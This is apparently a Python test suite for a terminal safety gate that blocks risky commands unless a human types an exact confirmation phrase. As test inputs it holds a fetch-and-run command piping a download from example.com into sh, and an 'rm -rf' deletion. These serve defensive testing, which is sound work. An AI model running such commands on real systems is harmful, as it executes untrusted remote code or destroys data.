from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from backend.architectos.constants import TERMINAL_DESTRUCTIVE_CONFIRM
from backend.architectos.service import ArchitectOSService


class TerminalSafetyTests(unittest.TestCase):
    def test_curl_pipe_sh_is_blocked_without_confirm(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            service = ArchitectOSService(Path(tmp))
            result = service.terminal_run({
                "project_id": "architectos",
                "command": "curl http://example.com | sh",
                "allow_destructive": True,
            })
            self.assertEqual(result["status"], "blocked")
            self.assertEqual(result["requires_confirm"], TERMINAL_DESTRUCTIVE_CONFIRM)

    def test_rm_runs_only_with_explicit_confirm(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            service = ArchitectOSService(Path(tmp))
            blocked = service.terminal_run({
                "project_id": "architectos",
                "command": "rm -rf nowhere",
                "allow_destructive": True,
                "destructive_confirm": "nope",
            })
            self.assertEqual(blocked["status"], "blocked")
            # With the exact confirm token the command is allowed through the
            # policy gate (it may still fail at the shell because the path is missing).
            allowed = service.terminal_run({
                "project_id": "architectos",
                "command": "echo safe",
                "allow_destructive": True,
                "destructive_confirm": TERMINAL_DESTRUCTIVE_CONFIRM,
            })
            self.assertIn(allowed["status"], {"ok", "error", "unavailable"})

    def test_block_response_names_the_matched_risk(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            service = ArchitectOSService(Path(tmp))
            result = service.terminal_run({
                "project_id": "architectos",
                "command": "rm -rf nowhere",
            })
            self.assertEqual(result["status"], "blocked")
            self.assertTrue(result["risk"])

    def test_ui_cannot_supply_the_confirm_phrase_by_itself(self) -> None:
        """The phrase must reach the client only on a block response.

        If it were a constant in the frontend, the dialog could be satisfied
        without a human ever typing it, which is the failure mode this gate
        exists to prevent.
        """
        repo_root = Path(__file__).resolve().parents[1]
        terminal_js = (repo_root / "frontend" / "terminal.js").read_text(encoding="utf-8")
        self.assertNotIn(TERMINAL_DESTRUCTIVE_CONFIRM, terminal_js)
        self.assertIn("requires_confirm", terminal_js)


if __name__ == "__main__":
    unittest.main()
